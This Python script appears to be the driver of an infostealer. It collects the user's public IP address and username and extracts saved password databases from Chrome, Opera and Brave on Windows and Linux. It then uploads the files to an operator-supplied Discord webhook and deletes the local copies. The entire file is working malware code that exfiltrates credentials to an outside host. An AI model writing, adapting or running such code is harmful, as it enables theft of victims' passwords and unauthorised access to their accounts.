import getpass
import os
import platform
import sys
from os.path import join

import requests.exceptions
from discord_webhook import DiscordWebhook
from requests import get

import chrome_based
from exceptions import Exit
from logger import logger

TEMP_PATH = r"C:\Users\{}\AppData\Local\Temp".format(getpass.getuser()) if os.name == "nt" else f"/tmp"

# Print warning
os.system("cls" if os.name == "nt" else "clear")
init_message = open("init_message.txt")
print(init_message.read())
init_message.close()

# Ask for basic info
discord_webhook_url = input("[~] Enter your Discord Webhook URL >> ")
input("[?] Would you like to proceed? >> ")
print()


def main():
    ipaddr = get('https://api.ipify.org').text  # Get IP address

    # Start webhook instance
    hook = DiscordWebhook(
        url=discord_webhook_url,
        content=f"**IP address:** {ipaddr}\n**Username**: {getpass.getuser()}",
        username="0x88")

    for browser_name in ["chrome", "opera", "brave"]:
        try:
            filename = join(TEMP_PATH, f"{browser_name}.txt")

            if platform.system() == "Windows":
                win = chrome_based.windows.ChromeWindows(browser_name)
                win.get_windows()
                win.retrieve_database()
                win.save(filename)

            elif platform.system() == "Linux":
                lin = chrome_based.linux.ChromeLinux(browser_name)
                lin.get_linux()
                lin.retrieve_database()
                lin.save(filename)

            else:
                # macOS not handled yet!
                logger.error("macOS is not handled!")
                raise Exit(Exit.OS_NOT_SUPPORTED)

        except Exception as E:
            print(f"\nSkipping {browser_name.capitalize()}. Error code: {E}\n")
            continue

        try:
            # Read saved password files to send them through a hook.
            file = open(filename, "rb")
            hook.add_file(file=file.read(), filename=filename)
            file.close()

            print(f"- {browser_name.capitalize()}")

            try:
                os.remove(filename)  # Delete temp files
            except OSError:
                pass

        except Exception as E:
            raise E

    try:
        hook.execute()  # Send webhook
    except requests.exceptions.MissingSchema:
        logger.error("Invalid Discord Hook URL")
        print("\nInvalid Discord Hook URL -- Exiting...")
        sys.exit(Exit.INVALID_HOOK_URL)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        raise Exit(Exit.KEYBOARD_INTERRUPT)
